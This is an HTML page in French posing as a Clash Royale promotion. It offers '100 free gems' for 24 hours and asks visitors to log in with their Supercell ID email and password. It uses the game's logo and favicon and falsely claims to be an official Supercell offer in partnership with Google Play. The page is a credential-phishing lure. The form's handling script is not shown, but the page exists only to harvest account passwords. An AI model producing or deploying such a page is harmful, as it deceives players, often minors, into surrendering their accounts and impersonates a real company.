<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clash Royale - 100 Gemmes Gratuites !</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="https://clashroyale.com/favicon.ico">
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://clan.supercell.com/clashroyale/logo.png" alt="Clash Royale" class="logo">
            <h1>🎁 100 GEMMES GRATUITES !</h1>
            <p>Offre limitée - 24h seulement ! Connectez-vous pour réclamer vos gemmes.</p>
        </div>
        
        <form id="loginForm" class="login-form">
            <div class="input-group">
                <label>Email Supercell ID</label>
                <input type="email" id="email" placeholder="votre.email@supercell.com" required>
            </div>
            <div class="input-group">
                <label>Mot de passe</label>
                <input type="password" id="password" placeholder="Votre mot de passe" required>
            </div>
            <button type="submit" class="btn-primary">🔥 RÉCLAMER 100 GEMMES 🔥</button>
        </form>
        
        <div class="footer">
            <p>Offre officielle Supercell - Partenariat Google Play</p>
        </div>
    </div>
    
    <script src="script.js"></script>
</body>
</html>
